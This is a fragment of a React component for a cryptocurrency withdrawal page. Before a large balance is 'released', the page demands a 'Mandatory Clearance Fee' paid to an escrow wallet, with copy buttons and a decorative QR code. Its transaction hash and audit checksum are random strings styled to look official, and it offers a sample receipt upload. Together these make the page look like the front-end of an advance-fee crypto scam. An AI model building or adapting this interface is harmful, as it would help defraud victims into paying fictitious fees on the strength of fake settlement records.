                      className="text-cyan-400 hover:text-cyan-300 flex items-center gap-1 transition-colors cursor-pointer"
                    >
                      {copiedKey === 'tx_hash' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>{copiedKey === 'tx_hash' ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>
                  <div className="font-mono text-gray-200 text-[11px] break-all select-all">
                    {txHash}
                  </div>
                </div>

                {/* Audit Checksum */}
                <div className="bg-[#050810] border border-[#162033] rounded-xl p-3.5 space-y-1">
                  <div className="flex items-center justify-between text-gray-400 text-[11px]">
                    <span className="font-semibold uppercase tracking-wider">Audit Checksum Hash</span>
                    <button
                      type="button"
                      onClick={() => handleCopy(checksum, 'checksum')}
                      className="text-cyan-400 hover:text-cyan-300 flex items-center gap-1 transition-colors cursor-pointer"
                    >
                      {copiedKey === 'checksum' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>{copiedKey === 'checksum' ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>
                  <div className="font-mono text-cyan-300 text-sm font-bold select-all">
                    {checksum}
                  </div>
                </div>

                {/* Recipient Destination Wallet */}
                <div className="bg-[#050810] border border-[#162033] rounded-xl p-3.5 space-y-1">
                  <div className="flex items-center justify-between text-gray-400 text-[11px]">
                    <span className="font-semibold uppercase tracking-wider">Recipient Destination Wallet</span>
                    <button
                      type="button"
                      onClick={() => handleCopy(activeRecipient, 'recipient')}
                      className="text-cyan-400 hover:text-cyan-300 flex items-center gap-1 transition-colors cursor-pointer"
                    >
                      {copiedKey === 'recipient' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>{copiedKey === 'recipient' ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>
                  <div className="font-mono text-emerald-300 text-xs break-all select-all">
                    {activeRecipient}
                  </div>
                </div>

                {/* Escrow Deposit Node */}
                <div className="bg-[#050810] border border-[#162033] rounded-xl p-3.5 space-y-1">
                  <div className="flex items-center justify-between text-gray-400 text-[11px]">
                    <span className="font-semibold uppercase tracking-wider">
                      Dedicated Escrow Node ({selectedNetwork.symbol})
                    </span>
                    <button
                      type="button"
                      onClick={() => handleCopy(selectedNetwork.escrowAddress, 'escrow')}
                      className="text-cyan-400 hover:text-cyan-300 flex items-center gap-1 transition-colors cursor-pointer"
                    >
                      {copiedKey === 'escrow' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>{copiedKey === 'escrow' ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>
                  <div className="font-mono text-gray-300 text-xs break-all select-all">
                    {selectedNetwork.escrowAddress}
                  </div>
                </div>
              </div>

              {/* Settlement Financial Itemization Table */}
              <div className="bg-[#060910] border border-[#172133] rounded-xl overflow-hidden">
                <div className="bg-[#090e1a] px-4 py-2.5 border-b border-[#172133] flex items-center justify-between text-xs font-bold text-gray-400 uppercase tracking-wider">
                  <span>Settlement Itemization</span>
                  <span>Amount / Valuation</span>
                </div>

                <div className="divide-y divide-[#131b29] text-xs">
                  <div className="p-3.5 flex items-center justify-between text-gray-300">
                    <div>
                      <span className="font-bold text-white block">
                        Gross Requested Capital ({activeAsset})
                      </span>
                      <span className="text-[11px] text-gray-400 font-mono">
                        {activeAmount} {activeSymbol} @ institutional spot rate
                      </span>
                    </div>
                    <span className="font-mono font-bold text-white text-sm">
                      ${activeUsdEquivalent.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                    </span>
                  </div>

                  <div className="p-3.5 flex items-center justify-between text-gray-300">
                    <div>
                      <span className="font-bold text-gray-200 block">
                        Mandatory Institutional Clearance Fee
                      </span>
                      <span className="text-[11px] text-gray-400">
                        Protocol KYC/AML multi-sig escrow reserve requirement
                      </span>
                    </div>
                    <span className="font-mono font-bold text-amber-400 text-sm">
                      -${clearanceFeeUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                    </span>
                  </div>

                  <div className="p-4 bg-[#070c17] flex items-center justify-between">
                    <div>
                      <span className="font-bold text-white text-sm block">
                        Net Disbursed Capital to Destination
                      </span>
                      <span className="text-[11px] text-emerald-400">
                        Authorized for on-chain transfer to {activeRecipient.slice(0, 8)}...
                      </span>
                    </div>
                    <span className="font-mono font-black text-emerald-400 text-base sm:text-lg">
                      ${netDisbursementValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                    </span>
                  </div>
                </div>
              </div>

              {/* Escrow Payment Details & Alternative Modal Trigger */}
              {!isCompleted && (
                <div className="bg-[#070b13] border border-[#1b253b] rounded-xl p-4 sm:p-5 flex flex-col sm:flex-row items-center justify-between gap-4">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-400 flex items-center justify-center shrink-0">
                      <QrCode className="w-5 h-5" />
                    </div>
                    <div>
                      <h4 className="text-xs sm:text-sm font-bold text-white">
                        Need Escrow Payment Details, QR Code or Interactive Simulation?
                      </h4>
                      <p className="text-[11px] text-gray-400 mt-0.5">
                        Open the clearance modal to scan escrow QR code or run automated node consensus
                      </p>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => setShowClearanceModal(true)}
                    className="px-4 py-2.5 bg-[#121a2c] hover:bg-[#1a253e] text-cyan-300 hover:text-white border border-cyan-500/40 rounded-xl text-xs font-bold transition-all cursor-pointer shrink-0"
                  >
                    Open Escrow QR & Simulation Modal
                  </button>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Tab 2: New Capital Withdrawal / Settlement Parameter Configuration */}
        {activeTab === 'new_withdrawal' && (
          <div className="p-4 sm:p-6 md:p-8 space-y-6">
            <div className="pb-4 border-b border-[#1b253b]">
              <h3 className="text-base sm:text-lg font-bold text-white">
                Reconfigure Capital Settlement Parameters
              </h3>
              <p className="text-xs text-gray-400 mt-1">
                Select network and payout destination address to generate an updated audited receipt.
              </p>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-gray-300 mb-2">
                  Select Payout Network
                </label>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  {NETWORKS.map((network) => {
                    const isSelected = selectedNetwork.id === network.id;
                    return (
                      <button
                        key={network.id}
                        type="button"
                        onClick={() => {
                          setSelectedNetwork(network);
                          setActiveRecipient(network.exampleAddress);
                        }}
                        className={`p-4 rounded-xl border text-left transition-all cursor-pointer flex flex-col justify-between ${
                          isSelected
                            ? 'bg-[#121c32] border-[#00C076] ring-1 ring-[#00C076]/40 shadow-md shadow-[#00C076]/10'
                            : 'bg-[#0a0e18] border-[#1b2438] text-gray-300 hover:border-[#283652]'
                        }`}
                      >
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-xs font-bold text-white">{network.name}</span>
                          <span className={`text-[10px] font-bold px-2 py-0.5 rounded border ${network.badgeColor}`}>
                            {network.symbol}
                          </span>
                        </div>
                        <div className="text-[11px] text-gray-400 font-mono">
                          {network.protocol}
                        </div>
                        <div className="text-[11px] text-gray-400 mt-2 pt-2 border-t border-[#182033] flex justify-between">
                          <span>Mining Gas:</span>
                          <span className="text-cyan-300 font-mono">${network.gasFeeUsd.toFixed(2)}</span>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold uppercase tracking-wider text-gray-300 mb-2">
                  Recipient Destination Address
                </label>
                <input
                  type="text"
                  value={activeRecipient}
                  onChange={(e) => setActiveRecipient(e.target.value)}
                  className="w-full bg-[#070b13] border border-[#1b253b] focus:border-[#00C076] focus:outline-none rounded-xl px-4 py-3.5 text-xs sm:text-sm font-mono text-gray-200 transition-colors"
                  placeholder={selectedNetwork.placeholder}
                />
              </div>

              <div className="pt-2 flex flex-col sm:flex-row gap-3">
                <button
                  type="button"
                  onClick={() => {
                    const newChecksum = `CHKSUM-ZL${Math.floor(10000 + Math.random() * 90000)}`;
                    const newHash = '0x' + Array.from({ length: 48 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
                    setChecksum(newChecksum);
                    setTxHash(newHash);
                    setSettlementTimestamp(Date.now());
                    setSettlementStatus('PENDING_CLEARANCE');
                    setUploadedFile(null);
                    setActiveTab('result_receipt');
                  }}
                  className="px-6 py-3.5 bg-[#00C076] hover:bg-[#00a868] text-[#07090e] font-bold text-xs sm:text-sm rounded-xl transition-all shadow-lg shadow-[#00C076]/20 flex items-center justify-center gap-2 cursor-pointer"
                >
                  <RefreshCw className="w-4 h-4" />
                  <span>Update & Regenerate Audited Receipt</span>
                </button>

                <button
                  type="button"
                  onClick={() => setActiveTab('result_receipt')}
                  className="px-4 py-3.5 bg-[#121724] hover:bg-[#1a2336] text-gray-300 text-xs font-semibold rounded-xl border border-[#20293d] transition-colors cursor-pointer"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Mandatory Clearance Fee Modal (Alternative / Companion to file upload) */}
      {showClearanceModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/80 backdrop-blur-md animate-in fade-in duration-200 overflow-y-auto">
          <div className="bg-[#0d121c] border border-cyan-500/40 rounded-2xl max-w-xl w-full p-4 sm:p-6 md:p-8 shadow-2xl relative my-auto sm:my-8 overflow-hidden max-h-[94vh] flex flex-col">
            {/* Modal Close Icon */}
            <button
              onClick={() => setShowClearanceModal(false)}
              className="absolute top-3.5 right-3.5 sm:top-5 sm:right-5 text-gray-400 hover:text-white p-1 rounded-lg hover:bg-[#1a2336] transition-colors cursor-pointer z-10"
              title="Close modal"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="overflow-y-auto pr-1 -mr-1 space-y-4">
              {/* Header */}
              <div className="flex items-start gap-3.5 pb-4 border-b border-[#1b253b]">
                <div className="w-11 h-11 rounded-xl bg-amber-500/15 border border-amber-500/30 text-amber-400 flex items-center justify-center shrink-0">
                  <AlertTriangle className="w-6 h-6" />
                </div>
                <div className="pr-6">
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] font-extrabold uppercase px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/30">
                      Mandatory Protocol Notice
                    </span>
                    <span className="text-xs text-cyan-400 font-mono">KYC / AML Escrow Rule</span>
                  </div>
                  <h2 className="text-lg sm:text-xl font-black text-white tracking-tight mt-1">
                    Mandatory Clearance Fee Protocol
                  </h2>
                </div>
              </div>

              {/* Explanation */}
              <div className="bg-[#080d16] border border-[#1a243a] rounded-xl p-4 space-y-2 text-xs text-gray-300 leading-relaxed">
                <p>
                  Releasing the on-chain settlement balance of{' '}
                  <span className="font-extrabold text-white font-mono bg-[#141b2a] px-1.5 py-0.5 rounded border border-[#222d42]">
                    ${activeUsdEquivalent.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                  </span>{' '}
                  requires standard clearance escrow deposit of:
                </p>

                <div className="flex items-center justify-between bg-[#0a1120] border border-cyan-500/30 p-3 rounded-lg my-1">
                  <div>
                    <span className="text-[10px] text-gray-400 block uppercase font-semibold">
                      Required Clearance Escrow Fee
                    </span>
                    <span className="text-xl font-black text-cyan-300 font-mono">
                      ${clearanceFeeUsd.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
                    </span>
                  </div>
                  <button
                    type="button"
                    onClick={() => handleCopy(clearanceFeeUsd.toFixed(2), 'modal_fee')}
                    className="px-2.5 py-1 bg-[#141d30] hover:bg-[#1a2640] text-cyan-300 border border-cyan-500/30 rounded text-xs font-medium flex items-center gap-1 transition-colors cursor-pointer"
                  >
                    {copiedKey === 'modal_fee' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedKey === 'modal_fee' ? 'Copied' : 'Copy Fee'}</span>
                  </button>
                </div>
              </div>

              {/* Escrow Address & QR */}
              <div className="bg-[#080c14] border border-[#1a2336] rounded-xl p-4 space-y-3">
                <div className="flex flex-col sm:flex-row items-center gap-4">
                  {/* QR SVG */}
                  <div className="bg-white p-2 rounded-xl shrink-0 shadow-md flex flex-col items-center">
                    <svg className="w-24 h-24" viewBox="0 0 100 100" fill="none">
                      <rect width="100" height="100" fill="white" />
                      <rect x="10" y="10" width="24" height="24" fill="black" />
                      <rect x="14" y="14" width="16" height="16" fill="white" />
                      <rect x="18" y="18" width="8" height="8" fill="black" />
                      <rect x="66" y="10" width="24" height="24" fill="black" />
                      <rect x="70" y="14" width="16" height="16" fill="white" />
                      <rect x="74" y="18" width="8" height="8" fill="black" />
                      <rect x="10" y="66" width="24" height="24" fill="black" />
                      <rect x="14" y="70" width="16" height="16" fill="white" />
                      <rect x="18" y="74" width="8" height="8" fill="black" />
                      <rect x="38" y="12" width="6" height="6" fill="black" />
                      <rect x="50" y="24" width="6" height="6" fill="black" />
                      <rect x="42" y="38" width="8" height="8" fill="#00C076" />
                      <rect x="62" y="38" width="6" height="6" fill="black" />
                      <rect x="74" y="54" width="6" height="6" fill="black" />
                      <rect x="42" y="66" width="6" height="6" fill="black" />
                      <rect x="62" y="70" width="6" height="6" fill="black" />
                    </svg>
                    <span className="text-[9px] font-bold text-gray-800 uppercase tracking-tighter mt-1">
                      Scan Escrow QR
                    </span>
                  </div>

                  <div className="flex-1 w-full space-y-2">
                    <div className="flex items-center justify-between text-xs">
                      <span className="font-bold text-gray-300">Dedicated Escrow Address:</span>
                      <span className="text-[10px] font-mono text-cyan-400 bg-cyan-950/40 px-2 py-0.5 rounded border border-cyan-800/40">
                        {selectedNetwork.symbol} Network
                      </span>
                    </div>

                    <div className="bg-[#05080e] border border-[#1a2336] rounded-lg p-2.5 font-mono text-[11px] text-gray-200 break-all select-all">
                      {selectedNetwork.escrowAddress}
                    </div>

                    <button
                      type="button"
                      onClick={() => handleCopy(selectedNetwork.escrowAddress, 'modal_escrow')}
                      className="w-full py-2 bg-[#121929] hover:bg-[#1a243a] text-cyan-300 hover:text-white border border-cyan-500/30 rounded-lg text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors cursor-pointer"
                    >
                      {copiedKey === 'modal_escrow' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedKey === 'modal_escrow' ? 'Address Copied!' : 'Copy Escrow Address'}</span>
                    </button>
                  </div>
                </div>
              </div>

              {/* Modal Actions */}
              <div className="space-y-2 pt-2">
                <button
                  type="button"
                  onClick={() => {
                    setShowClearanceModal(false);
                    if (!uploadedFile) {
                      handleAttachSampleFile();
                    }
                  }}
                  className="w-full py-3 px-4 bg-gradient-to-r from-[#00C076] to-[#00a868] text-[#07090e] font-extrabold text-xs sm:text-sm rounded-xl transition-all shadow-md shadow-[#00C076]/20 flex items-center justify-center gap-2 cursor-pointer"
                >
                  <FileUp className="w-4 h-4" />
                  <span>Attach Receipt File & Complete on /result</span>
                </button>

                <button
                  type="button"
                  onClick={() => setShowClearanceModal(false)}
                  className="w-full py-2 text-xs text-gray-400 hover:text-gray-200 transition-colors cursor-pointer text-center"
                >
                  Close Modal
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
